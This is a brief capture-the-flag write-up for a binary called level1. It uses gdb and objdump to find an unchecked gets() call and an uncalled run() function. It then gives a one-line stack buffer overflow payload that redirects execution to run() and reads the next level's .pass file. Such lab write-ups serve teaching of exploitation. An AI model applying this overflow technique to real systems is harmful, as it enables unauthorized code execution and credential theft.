Launch program with gdb and disassemble main

$ gdb ./level1
disas main

0x08048480 <+0>:	push   ebp
0x08048481 <+1>:	mov    ebp,esp
0x08048483 <+3>:	and    esp,0xfffffff0
0x08048486 <+6>:	sub    esp,0x50
0x08048489 <+9>:	lea    eax,[esp+0x10]
0x0804848d <+13>:	mov    DWORD PTR [esp],eax
0x08048490 <+16>:	call   0x8048340 <gets@plt>
0x08048495 <+21>:	leave
0x08048496 <+22>:	ret

At <main+6>, it allocates 80 bytes on the stack.
At <main+9>, it stores the string returned by <gets@plt> at [esp+16].
We can then do a buffer overflow to overwrite the $eip registers.
With objdump we notice that <run> function is never called.

$ objdump -d ./level1
...
08048444 <run>:
...

We now have to find the offset to overwrite $eip and replace it with <run> address.

$ cat <(python -c "print('A' * 76 + '\x08\x04\x84\x44'[::-1])") - | ./level1
cd /home/user/level2
cat .pass
